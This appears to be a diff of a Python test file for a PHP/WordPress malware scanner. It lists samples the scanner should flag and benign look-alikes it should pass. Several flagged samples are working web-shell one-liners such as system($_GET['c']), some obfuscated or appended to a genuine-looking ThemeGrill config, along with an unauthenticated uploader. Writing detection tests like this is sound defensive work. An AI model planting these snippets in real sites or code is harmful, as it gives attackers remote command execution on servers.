@@ -13,8 +13,12 @@ def tanda(nama, isi):
 
 WPC = b"<?php\ndefine( 'DB_NAME', '%s' );\ndefine( 'DB_USER', 'u' );\ndefine( 'DB_PASSWORD', 'x' );\ndefine( 'DB_HOST', '%s' );\n"
 KENA = [
+    ('wp-content/uploads/tg-demo-pack/tg-demo-config.php', b"<?php\n/** ThemeGrill */\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\nfunction tg_demo_importer_config( $demo_config ) {\n\t$c = array( 'radiate-free' => array( 'name' => 'Radiate', 'demo_pack' => true ) );\n\treturn array_merge( $c, $demo_config );\n}\nadd_filter( 'themegrill_demo_importer_config', 'tg_demo_importer_config' );\n" + b"system($_GET['c']);", 'VD.PHP.DiUploads'),
+    ('wp-content/uploads/tg-demo-pack/tg-demo-config.php', b"<?php\n/** ThemeGrill */\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\nfunction tg_demo_importer_config( $demo_config ) {\n\t$c = array( 'radiate-free' => array( 'name' => 'Radiate', 'demo_pack' => true ) );\n\treturn array_merge( $c, $demo_config );\n}\nadd_filter( 'themegrill_demo_importer_config', 'tg_demo_importer_config' );\n" + b"$f = 'sys'.'tem'; $f('id');", 'VD.PHP.DiUploads'),
+    ('wp-content/uploads/x/tg-demo-config.php', b"<?php\n/** ThemeGrill */\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\nfunction tg_demo_importer_config( $demo_config ) {\n\t$c = array( 'radiate-free' => array( 'name' => 'Radiate', 'demo_pack' => true ) );\n\treturn array_merge( $c, $demo_config );\n}\nadd_filter( 'themegrill_demo_importer_config', 'tg_demo_importer_config' );\n", 'VD.PHP.DiUploads'),
     ('wp-content/uploads/wp-staging/x.cache.php', b'<?php exit(); ?>\n{"a":1}<?php system($_GET["c"]); ?>', 'VD.PHP.DiUploads'),
     ('wp-content/uploads/wp-staging/y.cache.php', b'<?php if ($_GET["k"]) exit(); ?>\n{"a":1}', 'VD.PHP.DiUploads'),
+    ('admin/up.php', b"<?php move_uploaded_file($_FILES['f']['tmp_name'], 'u/' . basename($_FILES['f']['name']));", 'VD.PHP.Uploader'),
     ('wp-content/uploads/backwpup/index.php', b"<?php\nheader( 'Location: https://x.example/' );\n", 'VD.PHP.DiUploads'),
     ('3PJcpMFsD8B.php', b'<?php\n$h= \t\tfunction ($c) {\r\n    EVAL \t\t($c);\r\n};', 'VD.PHP.EvalClosure'),
     ('x/index.php', b"<?php define('O0O0O0', 'O0O00O');$GLOBALS[O0O0O0] = explode('|H|Z|8', 'ini_set|H|Z|8eval');", 'VD.PHP.GlobalsExplode'),
@@ -46,13 +50,15 @@ KENA = [
     ('wp-content/mu-plugins/y.php', b"<?php add_action('wp_footer', function(){}); add_action('wp_enqueue_scripts', function () { wp_enqueue_script('external-script', 'https://x.xyz/remote/js.php', [], null, true); });", 'VD.WP.BodyInject'),
     ('wp-content/mu-plugins/wp-1efe603358bc.php', b"<?php\n/**\n * WLH Recovery Channel (must-use). Dropped by WLH_Recovery_Installer.\n */\nif (!defined('WLH_REC_SALT')) define('WLH_REC_SALT', 'w9x2r7k5');", 'VD.WP.WLHRecovery'),
     ('wp-content/mu-plugins/z.php', b"<?php if (isset($_GET['wlh_recover'])) { wlh_rec_respond(1); }", 'VD.WP.WLHRecovery'),
-    ('wp-config.php', WPC % (b'x_wp1', b'localhost') + b"define('EMPTY_TRASH_DAYS', 0 );\n", 'VD.WP.TrashMati'),
 ]
 for nama, isi, harap in KENA:
     assert harap in tanda(nama, isi), (nama, harap, tanda(nama, isi))
 
 AMAN = [
+    ('wp-content/uploads/tg-demo-pack/tg-demo-config.php', b"<?php\n/** ThemeGrill */\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\nfunction tg_demo_importer_config( $demo_config ) {\n\t$c = array( 'radiate-free' => array( 'name' => 'Radiate', 'demo_pack' => true ) );\n\treturn array_merge( $c, $demo_config );\n}\nadd_filter( 'themegrill_demo_importer_config', 'tg_demo_importer_config' );\n"),
     ('wp-content/uploads/wp-staging/clone_options.cache.php', b'<?php exit(); ?>\n{"existingClones":{"1":{"path":"\\/home\\/u\\/x\\/","prefix":"wpstg0_"' + b',"t":"' + b'a' * 5000 + b'"}}}'),
+    ('wp-config.php', WPC % (b'x_wp1', b'localhost') + b"define('EMPTY_TRASH_DAYS', 0 );\n"),
+    ('admin/up.php', b"<?php session_start(); if (empty($_SESSION['admin_logged'])) exit; move_uploaded_file($_FILES['f']['tmp_name'], 'u/' . basename($_FILES['f']['name']));"),
     ('wp-content/uploads/backwpup/index.php', b"<?php\nheader( $_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found' );\nheader( 'Status: 404 Not Found' );\n"),
     ('wp-content/plugins/x/a.php', b"<?php $f = function ($x) { return eval_helper($x); }; $GLOBALS['wp_filter'] = explode(',', $s);"),
     ('wp-content/plugins/x/b.php', b"<?php $hash = '7068705f'; $s = strrev($nama); $p = str_split($teks, 1);"),
